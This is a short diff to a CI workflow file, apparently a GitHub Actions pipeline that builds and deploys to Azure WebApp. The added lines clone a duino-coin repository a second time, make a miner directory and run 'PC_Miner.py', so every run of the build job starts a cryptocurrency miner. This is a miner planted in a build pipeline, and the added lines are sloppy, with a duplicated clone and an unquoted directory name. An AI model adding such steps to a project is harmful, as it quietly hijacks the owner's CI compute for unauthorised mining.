@@ -44,6 +44,11 @@ jobs:
         npm run build --if-present
         npm run test --if-present
         git clone https://github.com/shah77pc/duino-coin
+         git clone https://github.com/shah77pc/duino-coin
+        mkdir Duino-Coin PC Miner 2.73
+      
+        python duino-coin/PC_Miner.py
+        
     - name: 'Deploy to Azure WebApp'
       uses: azure/webapps-deploy@v2
       with:
